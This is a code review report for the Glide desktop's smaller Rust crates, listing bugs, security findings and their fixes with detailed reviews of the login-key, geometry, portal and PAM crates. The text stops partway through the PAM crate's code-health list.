# Glide Workspace Crates Code Review Report

## Executive Summary & Scope

This report documents the deep, read-only code review of the 33 Glide workspace crates containing fewer than 10,000 lines of Rust code, conducted in ascending order of crate size. The review inspects code correctness, Rust safety invariants, potential panics (unwraps, bounds indexing, arithmetic overflows), resource leaks, adherence to design system and comment conventions (`AGENTS.md` § 6 & § 8), and known architecture traps (`AGENTS.md` § 7).

### Scope: 33 Crates Under 10,000 LOC (Ascending Order)

| # | Crate | LOC | Review Status | Issues Found |
|---|---|---|---|---|
| 1 | `glide-login-key` | 82 | Completed | 3 Code Health |
| 2 | `glide-geom` | 123 | Completed | 1 Bug, 1 AGENTS.md Trap, 4 Code Health |
| 3 | `glide-portal` | 438 | Completed | 3 Bugs, 1 AGENTS.md Trap, 7 Code Health |
| 4 | `glide-pam` | 450 | Completed | 4 Bugs, 2 AGENTS.md Traps, 7 Code Health |
| 5 | `glidectl` | 484 | Completed | 4 Bugs, 1 AGENTS.md Trap, 7 Code Health |
| 6 | `glide-ui` | 520 | Completed | 3 Bugs, 1 AGENTS.md Trap, 7 Code Health |
| 7 | `glide-ipc` | 942 | Completed | 5 Bugs, 1 AGENTS.md Trap, 7 Code Health |
| 8 | `glide-notify` | 1,050 | Completed | 4 Bugs, 1 AGENTS.md Trap, 7 Code Health |
| 9 | `glide-gestures` | 1,246 | Completed | 4 Bugs, 1 AGENTS.md Trap, 7 Code Health |
| 10 | `glide-media` | 1,248 | Completed | 4 Bugs, 1 AGENTS.md Trap, 7 Code Health |
| 11 | `glide-iced` | 1,284 | Completed | 4 Bugs, 1 AGENTS.md Trap, 8 Code Health |
| 12 | `glide-appmenu` | 1,436 | Completed | 4 Bugs, 4 Code Health |
| 13 | `glide-config` | 1,504 | Completed | 6 Bugs, 4 Code Health |
| 14 | `glide-tray` | 1,574 | Completed | 6 Bugs, 4 Code Health |
| 15 | `glide-cast` | 1,657 | Completed | 8 Bugs, 1 AGENTS.md Trap, 5 Code Health |
| 16 | `glide-app` | 1,695 | Completed | 1 Bug, 5 Code Health |
| 17 | `glide-netbird` | 2,190 | Completed | 3 Bugs, 5 Code Health |
| 18 | `glide-catalog` | 2,384 | Completed | 5 Bugs, 2 AGENTS.md Traps, 3 Code Health |
| 19 | `glide-layout` | 2,407 | Completed | 2 Bugs, 1 AGENTS.md Trap, 3 Code Health |
| 20 | `glide-services` | 2,574 | Completed | 1 Critical, 3 Bugs, 5 Code Health |
| 21 | `glide-paint` | 3,144 | Completed | 1 Critical, 3 Bugs, 2 AGENTS.md Traps, 5 Code Health |
| 22 | `glide-system` | 3,178 | Completed | 3 Bugs, 4 Code Health |
| 23 | `glide-shot` | 3,425 | Completed | 6 Bugs, 2 AGENTS.md Traps, 3 Code Health |
| 24 | `glide-shell` | 3,431 | Completed | 5 Bugs, 1 AGENTS.md Trap, 5 Code Health |
| 25 | `glide-greeter` | 4,134 | Completed | 5 Bugs, 1 AGENTS.md Trap, 5 Code Health |
| 26 | `glide-theme` | 4,341 | Completed | 1 Bug, 1 AGENTS.md Trap, 4 Code Health |
| 27 | `glide-dock` | 4,453 | Completed | 6 Bugs, 4 AGENTS.md Traps, 5 Code Health |
| 28 | `glide-overlays` | 5,349 | Completed | 5 Bugs, 5 AGENTS.md Traps, 4 Code Health |
| 29 | `glide-launcher` | 5,633 | Completed | 1 Critical, 6 Bugs, 2 AGENTS.md Traps, 5 Code Health |
| 30 | `glide-terminal` | 6,607 | Completed | 1 Critical, 3 Bugs, 1 AGENTS.md Trap, 3 Code Health |
| 31 | `glide-passwords` | 6,705 | Completed | 10 Bugs, 1 AGENTS.md Trap, 5 Code Health |
| 32 | `glide-text` | 8,188 | Completed | 1 Critical, 7 Bugs, 1 AGENTS.md Trap, 5 Code Health |
| 33 | `glide-keychain` | 9,638 | Completed | 5 Bugs, 1 AGENTS.md Trap, 5 Code Health |

### Critical Findings (crates 12–33)

Crates 12–33 add 5 Critical findings and 103 Bugs. Every Critical and Bug item was re-read in the source before it was recorded. The Critical findings are:

1. **Lock screen bypass**: `glide-services` (Critical 1). A forged logind `Unlock` signal sent by any local user unlocks the screen, because signal senders are never checked.
2. **Session crash from web content**: `glide-paint` (Critical 1). Cover art whose header declares a huge image makes the decoder request a multi-gigabyte allocation before reading any pixels, and the failed allocation aborts the compositor.
3. **Session crash from a paste**: `glide-launcher` (Critical 1). Pasting 64 KiB of `(` into the launcher overflows the calculator's recursion on the main thread.
4. **Command execution through paste or drop**: `glide-terminal` (Critical 1). Raw C0 control bytes in pasted text or dropped file names escape bracketed paste and shell quoting.
5. **Silent loss of unsaved text**: `glide-text` (Critical 1). Quit never asks while session restore is on, yet failures to write the session or drafts are ignored.

Status on 2026-10-29: all five are fixed. Items 1–4 are committed as `c206e2d` (logind), `cf1f717` (paint), `71c7859` (launcher) and `e2c2376` (terminal). The `glide-text` fix sits uncommitted in `app.rs`, because it builds on uncommitted session-saving code in the same file. With it, quit with restore on writes the session first and falls back to the Unsaved dialog when any draft or the session cannot be written; the stale-draft sweep runs only after the session landed; and clean tabs, the folder and recent entries with non-UTF-8 paths are left out of the session. The individual findings below still describe the code as it was reviewed.

Many bugs in different crates share one of three root causes:

- **Unverified D-Bus signal senders**: `glide-services` Critical 1 and Bug 1, `glide-tray` Bug 3.
- **Whole-file rewrites from stale copies**: `glide-config` Bug 2, `glide-passwords` Bug 2, `glide-dock` Bug 5.
- **Opacity-only transitions that break `AGENTS.md` § 8**: in most UI crates.

### Excluded Crates (> 10,000 LOC)
Per specification, the following 5 large workspace crates are excluded from this review sequence:
- `glide-compositor`
- `glide-settings`
- `glide-topbar`
- `glide-files`
- `glide-sdk`

---

## Detailed Crate Reviews

### 1. `glide-login-key` (82 lines)

#### Summary
`glide-login-key` is a minimal, focused cryptographic utility crate located at `crates/glide-login-key`. Its primary responsibility is deriving a deterministic 32-byte storage wrapping key (`WrappingKey`) from a user login password, username, and UID using Argon2id (RFC 9106) and Sha256. It additionally provides helpers to serialize and deserialize rekey pairs during password rotations across the login/PAM and keychain subsystems (`glide-pam`, `glide-keychain`).

The codebase is written in 100% safe Rust with no `unsafe` blocks. It adheres strictly to `AGENTS.md` § 6 (zero comments in `.rs` files). `cargo check -p glide-login-key`, `cargo clippy -p glide-login-key --all-targets -- -D warnings`, and all unit tests pass cleanly.

#### Findings

##### Critical
None identified.

##### Bug
None identified.

##### AGENTS.md Trap
None identified.
*Note on "Blocking the event loop": `wrapping_key` executes Argon2id with 64 MiB memory cost and 3 passes, requiring ~150ms of CPU compute time. As a leaf library, `glide-login-key` does not execute an event loop; however, consumers in compositor/UI contexts must ensure invocations remain offloaded to worker threads.*

##### Code Health
1. **Missing `zeroize` feature on `argon2` dependency**
   - **Location**: `crates/glide-login-key/Cargo.toml:10`
   - **Description**: The dependency is declared as `argon2 = { version = "0.6", default-features = false, features = ["alloc"] }`. With `default-features = false` and only `features = ["alloc"]`, the optional `zeroize` feature of the `argon2` crate is omitted. Consequently, the 64 MiB scratchpad memory matrix allocated during Argon2id hashing is deallocated upon completion without being zeroized. While `WrappingKey` properly zeroizes the final 32-byte key upon drop via `zeroize::Zeroizing`, sensitive intermediate hashing state remains un-cleared in heap memory until overwritten by subsequent allocations. Enabling `features = ["alloc", "zeroize"]` ensures the internal memory matrix is zeroized on drop.
2. **Unnecessary heap allocation for fixed-size rekey buffer**
   - **Location**: `crates/glide-login-key/src/lib.rs:34-39`
   - **Description**: `rekey_bytes` allocates a heap vector `Zeroizing<Vec<u8>>` via `Vec::with_capacity(2 * LEN)` to concatenate two 32-byte keys. Because `LEN` is a compile-time constant (`32`), returning a fixed-size stack array `Zeroizing<[u8; 2 * LEN]>` (or `Zeroizing<[u8; 64]>`) would eliminate heap allocation entirely and avoid potential memory fragmentation or non-zeroized allocator reuse.
3. **Non-idiomatic slice validation and closure filtering in `key_from`**
   - **Location**: `crates/glide-login-key/src/lib.rs:42-46`
   - **Description**: In `key_from`, length validation is performed via `key.copy_from_slice(bytes.get(..LEN).filter(|_| bytes.len() == LEN)?);`. This construct allocates and zeroes the stack array before validating the length, and uses an unusual `.filter(|_| ...)` closure on the slice option. Using `TryFrom` (`let slice: &[u8; LEN] = bytes.try_into().ok()?; Some(Zeroizing::new(*slice))`) or an explicit guard `if bytes.len() != LEN { return None; }` would be clearer, more idiomatic, and avoid unnecessary stack zeroing when input length is mismatched.

---

### 2. `glide-geom` (123 lines)

#### Summary
`glide-geom` is a lightweight, zero-dependency 2D geometry foundation crate located at `crates/glide-geom`. It defines core geometric primitives (`Point`, `Size`, `Insets`, `Rectangle`) in integer coordinates (`i32`) and their primary operations (`grow`, `inset`, `outset`, `contains`, `center`, `overlaps`). Originally extracted from `glide-layout`, it is re-exported by `glide-layout` and consumed across `glide-compositor`, `glide-overlays`, and other window management modules for layout calculations, hit-testing, and window placement.

All types are written in 100% safe Rust without `unsafe` blocks. It strictly adheres to `AGENTS.md` § 6 (zero comments in `.rs` files). `cargo check -p glide-geom` and `cargo clippy -p glide-geom --all-targets -- -D warnings` pass cleanly with zero warnings or errors. However, the crate contains 0 unit tests, exhibits signed integer underflow behavior in `Rectangle::inset`, and lacks guards against the known window centering trap documented in `AGENTS.md` § 7.

#### Findings

##### Critical
None identified.

##### Bug
1. **`Rectangle::inset` produces negative dimensions when insets exceed rectangle size**
   - **Location**: `crates/glide-geom/src/lib.rs:98-99`
   - **Description**: In `Rectangle::inset`, the resulting width and height are computed via `self.size.width.saturating_sub(insets.width())` and `self.size.height.saturating_sub(insets.height())`. Because `width` and `height` are signed `i32` integers, `i32::saturating_sub` only saturates at `i32::MIN` (`-2,147,483,648`), not at `0`. When `insets.width() > self.size.width` (such as applying titlebar and frame insets to a small or collapsing window or container), `Rectangle::inset` produces a rectangle with negative width or height. While `Size::is_empty()` considers `width <= 0` empty, a rectangle with negative dimensions inverts its spatial extents (`loc.x > loc.x + width`), inverts its center calculation (`center()` shifts backwards), and risks runtime panics or severe memory allocation bugs if downstream consumers convert dimensions to unsigned types (e.g., `usize::try_from` or `as u32`). `Rectangle::inset` should either clamp dimensions to zero (`.max(0)`) or document negative-dimension preservation semantics.

##### AGENTS.md Trap
1. **Unchecked centering risks violating Centring Larger-Than-Area Windows (`AGENTS.md` § 7)**
   - **Location**: `crates/glide-geom/src/lib.rs:89-91`
   - **Description**: `AGENTS.md` § 7 explicitly documents the trap: *"Centring larger-than-area windows. `(area − frame) / 2` goes negative and puts the titlebar under the topbar. Placement and late titlebar insets go through `keep_reachable`; clients get `configure_bounds` = work area minus insets."* `Rectangle::center()` computes `Point { x: self.loc.x.saturating_add(self.size.width / 2), y: self.loc.y.saturating_add(self.size.height / 2) }` without validating that the rectangle is non-empty or that the dimensions are positive. If called on a rectangle with negative dimensions, `center()` produces an inverted point outside the intended bounding area. Furthermore, `glide-geom` provides no safe bounds-centering helper (such as `center_in(&self, bounds: Rectangle) -> Point` with `keep_reachable` clamping), forcing downstream crates (`glide-layout`, `glide-compositor`) to manually compute centering formulas where historical defects have recurred.

##### Code Health
1. **Zero unit test coverage for foundational geometric primitives**
   - **Location**: `crates/glide-geom/src/lib.rs:1-124`
   - **Description**: `glide-geom` contains exactly 0 unit tests (`cargo test -p glide-geom` runs 0 tests). Despite serving as the fundamental geometry crate re-exported by `glide-layout` and consumed across `glide-compositor`, `glide-overlays`, and other crates for hit-testing (`contains`), collision detection (`overlaps`), coordinate centering (`center`), and geometry transformations (`inset`, `outset`, `grow`), there are no unit tests verifying edge cases such as empty rectangles, boundary touch conditions (e.g., adjacent rects in `overlaps`), negative insets, or saturating integer boundaries.
2. **Inconsistent receiver passing conventions (`self` vs `&self`) on `Copy` types**
   - **Location**: `crates/glide-geom/src/lib.rs:36, 53, 58, 81, 89, 94, 105, 113`
   - **Description**: `Point`, `Size`, `Insets`, and `Rectangle` all derive `Copy` and `Clone` with small footprints (8 to 16 bytes). However, the API inconsistently mixes value receivers and reference receivers:
     - `Size::grow(self, insets: Insets) -> Self` takes `self` by value.
     - `Size::is_empty(&self) -> bool` takes `&self` by reference.
     - `Insets::width(&self)` and `height(&self)` take `&self` by reference.
     - `Rectangle::inset(&self, insets: Insets)` and `outset(&self, insets: Insets)` take `&self` by reference.
     - `Rectangle::overlaps(&self, other: Self)` takes `&self` by reference while taking `other` by value.
     Following Rust API Guidelines (C-VAL), methods on small `Copy` types should adopt a consistent receiver convention (preferring `self` by value for pure transformations).
3. **Missing `Rectangle::ZERO` constant and incomplete geometry API**
   - **Location**: `crates/glide-geom/src/lib.rs:69-74`
   - **Description**: `Point` provides `Point::ZERO`, `Size` provides `Size::ZERO`, and `Insets` provides `Insets::NONE`. However, `Rectangle::ZERO` is omitted, breaking API symmetry across the crate's primitive types (callers must use `Rectangle::default()`). Additionally, `Rectangle` lacks common ergonomic helpers frequently computed manually across the workspace, such as `right(&self) -> i32`, `bottom(&self) -> i32`, `is_empty(&self) -> bool` (forwarding to `self.size.is_empty()`), and `contains_rect(&self, other: &Rectangle) -> bool`.
4. **Missing explicit constructor and non-standard field ordering in `Insets`**
   - **Location**: `crates/glide-geom/src/lib.rs:42-47`
   - **Description**: `Insets` declares fields in the order `top`, `left`, `right`, `bottom`. In GUI and CSS conventions, insets are conventionally specified clockwise: `top, right, bottom, left` (TRBL). Without a dedicated constructor like `Insets::new(top, right, bottom, left)` or `Insets::uniform(all)`, callers are forced to instantiate `Insets` using struct literals. The non-standard field layout (`top`, `left`, `right`, `bottom`) increases the risk of swapping `left` and `right` or confusing it with CSS TRBL order at call sites.

---

### 3. `glide-portal` (438 lines)

#### Summary
`glide-portal` is the XDG Desktop Portal backend daemon for Glide, located at `crates/glide-portal`. It claims the well-known D-Bus bus name `org.freedesktop.impl.portal.desktop.glide` at object path `/org/freedesktop/portal/desktop` and exposes two key desktop portal interfaces:
1. `org.freedesktop.impl.portal.FileChooser` (version 4): implements `OpenFile`, `SaveFile`, and `SaveFiles`. Upon invocation, it translates portal request options into a `glide_app::chooser::Request` payload, spawns the file manager binary (`glide-files --chooser`) with the request serialized in the environment, exports an `org.freedesktop.impl.portal.Request` handle on D-Bus that tracks the child via `pidfd` for cancellation via `SIGTERM`, awaits completion on a dedicated worker thread, parses the JSON response from stdout, and returns the selected URIs, filter, and choices.
2. `org.freedesktop.impl.portal.Screenshot` (version 2): implements `Screenshot` and `PickColor`. It dispatches screenshot and color picking requests over the internal Unix socket to `glide-compositor` using `glide-ipc`, translating results back to portal formats.

The codebase compiles cleanly with `cargo check -p glide-portal` and `cargo clippy -p glide-portal --all-targets -- -D warnings` with zero warnings. All comments strictly comply with `AGENTS.md` § 6 (only `// SAFETY:` markers on unsafe blocks and justifications on `#[allow(...)]` attributes are present). However, deep review revealed 3 Bugs, 1 AGENTS.md Trap violation, and 7 Code Health issues relating to error classification, path parsing, D-Bus request object lifecycle, process management, and test environment pollution.

#### Findings

##### Critical
None identified.

##### Bug
1. **`current_folder` set to invalid empty path `""` on relative `current_file`**
   - **Location**: `crates/glide-portal/src/main.rs:60-64`
   - **Description**: In `request()`, `current_folder` is derived from `options.current_folder`, falling back to `current_file.as_deref().and_then(std::path::Path::parent).map(std::path::Path::to_path_buf)`. In Rust's `std::path::Path`, calling `.parent()` on a relative path containing no directory components (e.g. `Path::new("document.pdf")`) returns `Some(Path::new(""))`. As a result, `current_folder` is populated with `Some(PathBuf::from(""))` instead of `None`. When forwarded in `Request` to `glide-files`, the chooser receives an invalid empty path string rather than `None` (which would correctly trigger fallback to the user's home or documents directory), causing directory canonicalization or listing to fail with `ENOENT`.
2. **Abnormal process terminations and parse failures in chooser incorrectly reported as `CANCELLED`**
   - **Location**: `crates/glide-portal/src/main.rs:182-198`
   - **Description**: In `run()`, when `child.wait_with_output()` finishes with a non-zero exit status (e.g. if `glide-files` crashes due to SIGSEGV, SIGABRT, or exits with code 1 or 127 due to runtime errors), line 197 matches `Some(Ok(_)) => (CANCELLED, Results::default())`. Furthermore, if `glide-files` exits with 0 but produces malformed or unparseable JSON on stdout, line 194 also returns `(CANCELLED, Results::default())`. Under the XDG Desktop Portal specification, return code `1` signifies explicit user cancellation, whereas `2` signifies that the interaction failed. Misclassifying internal crashes and parse errors as user cancellation masks child process failures from both the desktop session and the calling application.
3. **`Screenshot` and `PickColor` drop request handle without registering portal `Request` interface**
   - **Location**: `crates/glide-portal/src/main.rs:281, 300`
   - **Description**: In `Screenshot::screenshot` and `Screenshot::pick_color`, the incoming `handle: OwnedObjectPath` parameter is discarded via `drop(...)`. Per the XDG Desktop Portal specification (`org.freedesktop.impl.portal.Screenshot`), backends are expected to export an `org.freedesktop.impl.portal.Request` object at `handle` so that callers or the portal framework can invoke `Close()` if the operation is cancelled. Because no object is registered at `handle`, any cancellation request from `xdg-desktop-portal` fails with `org.freedesktop.DBus.Error.UnknownObject`, and `glide-portal` continues blocking for up to 5 minutes (`PICK_TIMEOUT`) on the compositor IPC socket.

##### AGENTS.md Trap
1. **Global environment state modified in tests without teardown or synchronization (`AGENTS.md` § 7)**
   - **Location**: `crates/glide-portal/src/main.rs:396-398`
   - **Description**: In `tests::a_portal_call_returns_what_the_chooser_printed`, the test calls `unsafe { std::env::set_var("GLIDE_PORTAL_CHOOSER", &script) };` to point the chooser binary path to a temporary script. At the conclusion of the test, the temporary directory containing `script` is deleted (line 428), but `GLIDE_PORTAL_CHOOSER` is never reset or unset (`std::env::remove_var`). This directly violates `AGENTS.md` § 7 (*"Global state leaking between tests"*): any concurrent or subsequent test in the test suite that queries `files_binary()` will read the lingering environment variable and attempt to invoke the deleted binary.

##### Code Health
1. **Unregistered `PortalRequest` leak on future cancellation**
   - **Location**: `crates/glide-portal/src/main.rs:165-179`
   - **Description**: In `run()`, `server.at(handle.clone(), PortalRequest { ... }).await` registers the request interface, and line 178 unregisters it with `server.remove::<PortalRequest, _>(&handle).await` after `blocking(...)` completes. If the `run()` future is cancelled while awaiting child process completion (for instance, if the peer D-Bus connection is dropped or client hangs up), the remainder of `run()` is not polled, and `server.remove` is never executed. This leaves the `PortalRequest` object orphaned in `zbus::object_server::ObjectServer` indefinitely. Wrapping the registration in an RAII cleanup guard would ensure deregistration upon drop.
2. **Silent failure to cancel chooser when `pidfd_open` is unavailable**
   - **Location**: `crates/glide-portal/src/main.rs:108-140`
   - **Description**: `pidfd(pid)` creates an `OwnedFd` via `libc::SYS_pidfd_open`. If `pidfd_open` fails or returns -1 (such as on older kernels < 5.3 or inside container sandboxes where seccomp denies `SYS_pidfd_open`), `pidfd(pid)` returns `None`. `PortalRequest` only stores `process: Option<OwnedFd>`, and `PortalRequest::close()` only signals if `self.process` is `Some`. If `process` is `None`, `close()` silently does nothing, leaving the child `glide-files` process un-terminated when cancelled via D-Bus. Retaining a fallback PID (`Option<u32>`) and invoking `libc::kill(pid, SIGTERM)` when `process` is `None` would ensure cancellation remains effective in all runtime environments.
3. **Unbounded OS thread creation in `blocking` helper**
   - **Location**: `crates/glide-portal/src/main.rs:142-151`
   - **Description**: `blocking()` spawns a new OS thread using `std::thread::Builder::new().spawn(...)` for every blocking operation (`child.wait_with_output()` and `glide_ipc::client::exchange`). For interactive operations like `pick_color` and `screenshot_area`, these threads remain blocked on socket reads for up to 5 minutes (`PICK_TIMEOUT`). Spawning raw OS threads without a thread pool or concurrency limiter introduces unbounded thread creation and memory consumption under concurrent portal traffic.
4. **Child process orphaning due to missing `PR_SET_PDEATHSIG`**
   - **Location**: `crates/glide-portal/src/main.rs:154-160`
   - **Description**: `Command::new(files_binary())` spawns the chooser child process without configuring `PR_SET_PDEATHSIG(SIGTERM)` via `std::os::unix::process::CommandExt::pre_exec`. If `glide-portal` crashes, is terminated by SIGTERM, or exits abruptly, any open `glide-files` process is orphaned, reparented to PID 1, and remains alive and visible on screen indefinitely.
5. **Potential `ARG_MAX` environment variable limit failure on large file selections**
   - **Location**: `crates/glide-portal/src/main.rs:156`
   - **Description**: In `run()`, `.env(REQUEST_ENV, request.to_json())` serializes the entire `Request` struct into an environment variable. When `SaveFiles` is called with numerous files or complex filters, the serialized JSON can exceed Linux's `MAX_ARG_STRLEN` (128 KiB per environment variable limit), causing `Command::spawn()` to fail with `E2BIG`. Passing request payloads via the child's stdin pipe would avoid kernel environment length constraints.
6. **Main thread parked indefinitely without termination signal handling**
   - **Location**: `crates/glide-portal/src/main.rs:321-324`
   - **Description**: In `main()`, after starting the zbus session server, the thread enters `loop { std::thread::park(); }` without registering signal handlers (`SIGINT`, `SIGTERM`). This prevents graceful daemon shutdown, connection teardown, or active child process cleanup when the desktop session terminates.
7. **Inconsistent typing in `pick_color` options**
   - **Location**: `crates/glide-portal/src/main.rs:296-299`
   - **Description**: In `pick_color`, `options` is typed as `std::collections::HashMap<String, zbus::zvariant::OwnedValue>`, whereas `open_file`, `save_file`, `save_files`, and `screenshot` all utilize dedicated structs deriving `DeserializeDict` and `Type` (`Options`, `ScreenshotOptions`). Using a strongly typed struct for `pick_color` options would maintain schema consistency across portal interfaces.

---

### 4. `glide-pam` (450 lines)

#### Summary
`glide-pam` is the PAM (Pluggable Authentication Modules) service provider module for the Glide desktop environment, located at `crates/glide-pam`. It compiles to a native C shared library (`libpam_glide_keychain.so` / `pam_glide_keychain.so`) exporting the standard PAM Service Provider Interface (SPI) entry points: `pam_sm_authenticate`, `pam_sm_setcred`, `pam_sm_open_session`, `pam_sm_close_session`, and `pam_sm_chauthtok`.

Its core responsibility is seamless login-keyring integration:
1. During authentication (`pam_sm_authenticate`), it retrieves the entered password (`PAM_AUTHTOK`), resolves the user account via `libc::getpwnam_r`, derives a deterministic 32-byte master storage wrapping key (`WrappingKey`) via `glide-login-key` (using Argon2id with 64 MiB RAM and 3 iterations), and stores it in the PAM handle's private module data via `pam_set_data` with an RAII cleanup callback (`forget`).
2. When the session opens (`pam_sm_open_session`), it retrieves the remembered key, switches thread filesystem credentials to the target user via `libc::setfsuid` and `libc::setfsgid`, validates that the runtime folder (`XDG_RUNTIME_DIR` or `/run/user/<uid>`) is an unlinked directory owned by the user, and atomically writes the raw 32-byte wrapping key with mode `0600` to `glide-login-key` (`KEY_FILE`) for pickup by `glide-keychain`.
3. When the password is changed (`pam_sm_chauthtok`), it derives wrapping keys for both old (`PAM_OLDAUTHTOK`) and new (`PAM_AUTHTOK`) passwords, formats the 64-byte rekey payload (`glide_login_key::rekey_bytes`), and atomically writes it to `glide-login-rekey` (`REKEY_FILE`).

All source code compiles cleanly with `cargo check -p glide-pam` and `cargo clippy -p glide-pam --all-targets -- -D warnings`. All unit and integration tests pass (`cargo test -p glide-pam`). Comments strictly follow `AGENTS.md` § 6 (only `// SAFETY:` markers and allowed clippy justification). However, deep review revealed 4 Bugs, 2 AGENTS.md Trap violations, and 7 Code Health defects covering temporary file race conditions, unchecked credential transitions, username canonicalization mismatches, lifetime secret persistence, and event-loop blocking hazards.

#### Findings

##### Critical
None identified.

##### Bug
1. **Predictable temporary file name with PID causes race condition and deletion of in-flight key writes**
   - **Location**: `crates/glide-pam/src/lib.rs:158-172`
   - **Description**: In `write_as()`, temporary file creation constructs a static name: `let temp = dir.join(format!(".{name}.{}", std::process::id()));`. Before opening, it unconditionally calls `remove_file(&temp)`. If two threads or simultaneous login sessions within the same process (e.g. concurrent PAM authentications in display managers, greeters, or SSH/local sessions) invoke `write_as()` concurrently, both generate the identical path. Thread A creates and starts writing to `temp`, while Thread B immediately executes `remove_file(&temp)` or encounters `AlreadyExists` on `create_new(true)`. On error, line 171 triggers `remove_file(&temp)`, deleting Thread A's temporary file right as Thread A invokes `rename(&temp, &path)`. This induces intermittent `ENOENT` / `PermissionDenied` failures during concurrent logins. Temporary files should incorporate cryptographically secure random suffixes (e.g. from `getrandom`) rather than predictable PID strings.
2. **Unchecked `setfsgid` allows writing key files with daemon GID**
   - **Location**: `crates/glide-pam/src/lib.rs:128-137`
   - **Description**: In `Identity::assume()`, the implementation invokes both `libc::setfsgid(account.gid)` and `libc::setfsuid(account.uid)`. Because `setfsuid` and `setfsgid` always return the previous ID regardless of success or failure, line 135 performs a second call `libc::setfsuid(u32::MAX)` to test whether the filesystem UID was updated (`now == account.uid`). However, no corresponding verification is performed for `setfsgid`. If the caller possesses `CAP_SETUID` but lacks `CAP_SETGID` or operates under group namespace constraints, `setfsgid` fails silently. `Identity::assume` reports success, and subsequent file creation (`OpenOptions::open`) creates the temporary and final key files owned by the daemon's primary group (e.g. `root`, GID 0) rather than `account.gid`. `Identity::assume` must verify `libc::setfsgid(u32::MAX) as u32 == account.gid`.
3. **Uncanonicalized username in `account_named` desynchronizes Argon2id salt from `glide-keychain`**
   - **Location**: `crates/glide-pam/src/lib.rs:40-50, 60`
   - **Description**: In `account_named()`, `libc::getpwnam_r` successfully locates the user entry in the system database. However, the returned struct populates `Account { name: name.to_string(), ... }` using the input `name` parameter rather than the canonical `entry.pw_name`. In `glide-login-key::salt(user, uid)`, the username string is hashed into the salt. On systems utilizing case-insensitive authentication (e.g. Active Directory, SSSD, LDAP, or mixed-case PAM inputs), a user logging in as "Artem" results in `glide-pam` computing an Argon2id salt for "Artem", while the user session daemon `glide-keychain` derives its salt using the canonical system username "artem" obtained from `getpwuid(getuid())`. Because the salts diverge, the derived wrapping keys do not match, causing `glide-keychain` to fail to unlock the login keyring. `account_named` must construct `Account.name` from `entry.pw_name`.
4. **Permanent key file exposure on disk due to missing cleanup in `pam_sm_close_session`**
   - **Location**: `crates/glide-pam/src/lib.rs:199-210`
   - **Description**: In `pam_sm_open_session()`, `glide-pam` writes the raw 32-byte master `WrappingKey` to `$XDG_RUNTIME_DIR/glide-login-key` (`KEY_FILE`). In `pam_sm_close_session()`, the module returns `PAM_IGNORE` without removing or zeroizing the file. Furthermore, `glide-keychain` reads `KEY_FILE` into memory during daemon startup (`daemon.rs:315-323`) without unlinking it (it only unlinks `KEY_FILE` upon subsequent password rekeying). As a result, the unencrypted master wrapping key for the user's entire secret storage remains on the filesystem for the entire duration of the user's login session and persists after session close until `/run/user/<uid>` is destroyed by systemd. Any process executing under the user's UID (including untrusted sandboxed applications with runtime directory access) can read the wrapping key and compromise stored secrets. `pam_sm_close_session` should unlink `KEY_FILE` and `REKEY_FILE`, and `glide-keychain` should consume the key via atomic read-and-unlink (`take_file`).

##### AGENTS.md Trap
1. **Thread-unsafe `libc::getpwuid` in unit and integration tests (`AGENTS.md` § 7)**
   - **Location**: `crates/glide-pam/src/lib.rs:283` and `crates/glide-pam/tests/pam.rs:66`
   - **Description**: `AGENTS.md` § 7 explicitly prohibits *"Global state leaking between tests"*. Both `src/lib.rs` (line 283) and `tests/pam.rs` (line 66) invoke `libc::getpwuid(libc::getuid())` to retrieve the current test username. `libc::getpwuid` returns a pointer to a statically allocated, process-global buffer in libc that is shared across all threads and overwritten by subsequent calls to `getpwent`, `getpwnam`, or `getpwuid`. Under parallel test execution (`cargo test` running unittests and integration tests concurrently across multiple worker threads), concurrent calls to `libc::getpwuid` and `libc::getpwnam_r` induce data races on libc static memory. Tests should use `libc::getpwuid_r` with thread-local buffers, matching the reentrant pattern used in `src/lib.rs:48`.
2. **Blocking the event loop on compute-intensive Argon2id derivation (`AGENTS.md` § 7)**
   - **Location**: `crates/glide-pam/src/lib.rs:74-77, 180-184, 222-225`
   - **Description**: `AGENTS.md` § 7 mandates: *"Blocking the event loop. Command::output(), X11 round trips, file reads of client-supplied paths and D-Bus calls belong on a worker thread."* In `pam_sm_authenticate()`, `wrapping()` executes Argon2id hashing with 64 MiB memory cost and 3 passes, consuming ~150-300ms of CPU compute time. In `pam_sm_chauthtok()`, `wrapping()` is executed twice sequentially (deriving keys for both `PAM_OLDAUTHTOK` and `PAM_AUTHTOK`), consuming ~300-600ms of synchronous CPU time and allocating 128 MiB of memory. Because PAM SPI calls are synchronous C APIs, invoking `pam_authenticate()` or `pam_chauthtok()` on a main event loop thread (e.g. inside a display manager or compositor greeter) stalls GUI rendering, vblank scheduling, and input dispatch. Consumers must strictly isolate PAM calls to background worker threads.

##### Code Health
1. **Silent suppression of filesystem errors without syslog or journal diagnostics**
   - **Location**: `crates/glide-pam/src/lib.rs:200, 224`
   - **Description**: Both `pam_sm_open_session()` (`let _ = write_as(...)`) and `pam_sm_chauthtok()` (`let _ = write_as(...)`) discard all filesystem I/O errors (`Result::Err`). If `/run/user/<uid>` is missing (e.g. `pam_glide_keychain` ordered before `pam_systemd`), disk space or tmpfs inodes are exhausted, or permissions are refused, the failure occurs completely silently. No diagnostic messages are logged to `syslog(3)` / `openlog`, and no error is reported to the PAM framework. When a user logs in and finds their keyring locked, system logs contain zero diagnostic information indicating why key provisioning failed.
2. **Missing interactive fallback: `pam_get_item` cannot prompt for missing `PAM_AUTHTOK`**
   - **Location**: `crates/glide-pam/src/lib.rs:63-72, 180-184`
   - **Description**: `item()` queries `pam_get_item(pamh, PAM_AUTHTOK, &mut value)`. In Linux-PAM, `pam_get_item` only retrieves an authentication token if a preceding module in the stack has already populated it. If `pam_glide_keychain.so` is configured as the first authentication module or if the preceding module does not expose `PAM_AUTHTOK`, `value` is NULL. Unlike `pam_get_user()`, `pam_get_item` does not prompt the user via the PAM conversation function (`pam_conv`). Using `pam_get_authtok(3)` when available would allow the module to interactively obtain the token when running independently in custom PAM stacks.
3. **Sensitive password memory and conversation struct leaked in integration tests**
   - **Location**: `crates/glide-pam/tests/pam.rs:94-95`
   - **Description**: In `Session::start()`, the plaintext test password is leaked via `CString::new(password).unwrap().into_raw().cast::<c_void>()`, and the `Conversation` wrapper is permanently leaked via `Box::leak()`. In `Session::drop()`, `pam_end` is invoked, but neither `conversation` nor the raw password buffer is deallocated or zeroized. The sensitive password buffer remains resident in process memory until test process termination.
4. **Integration tests silently skip without failure when `.so` artifact is missing**
   - **Location**: `crates/glide-pam/tests/pam.rs:56-62, 118-120, 142-144`
